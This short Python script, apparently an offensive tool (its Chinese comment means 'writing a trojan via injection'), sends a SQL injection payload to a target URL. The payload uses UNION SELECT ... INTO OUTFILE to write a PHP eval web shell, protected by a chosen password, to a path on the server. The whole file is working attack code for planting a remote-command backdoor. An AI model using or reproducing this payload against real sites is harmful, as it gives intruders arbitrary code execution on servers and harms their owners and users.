import requests
from bs4 import BeautifulSoup

# 写马注入
# 参数一url，参数二写入的路径，参数三密码(eval($_POST[密码];))
def writher(url,path,cmd="cmd"):
    payload = "union select 1,2,'<?php @eval($_POST[\"{0}\"]);?>' into outfile \"{1}\"--+".\
        format(cmd,path);
    response = requests.get(url + payload)